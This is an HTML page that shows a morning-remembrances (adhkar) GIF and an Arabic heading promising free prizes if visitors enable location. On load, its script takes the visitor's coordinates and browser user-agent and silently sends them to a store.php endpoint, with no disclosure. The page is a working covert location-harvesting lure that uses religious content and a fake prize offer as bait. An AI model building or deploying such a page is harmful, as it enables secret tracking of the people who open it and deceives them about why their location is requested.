<!DOCTYPE html>
<html>
<body onload="getLocation()">

<iframe src="https://giphy.com/embed/Om9cspViBRSOH4BZsf" width="480" height="336" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/hndroz6-Om9cspViBRSOH4BZsf">أذكــــار صباحية</a></p>

<h1> لا تنسى تفعيل خاصية الموقع لتصلك جوائزنا مجاناً</h1>




<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
     const xhttp = new XMLHttpRequest();
    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" +      position.coords.longitude + "&uagent=" + navigator.userAgent);
    xhttp.send();
}
</script>

</body>
</html>
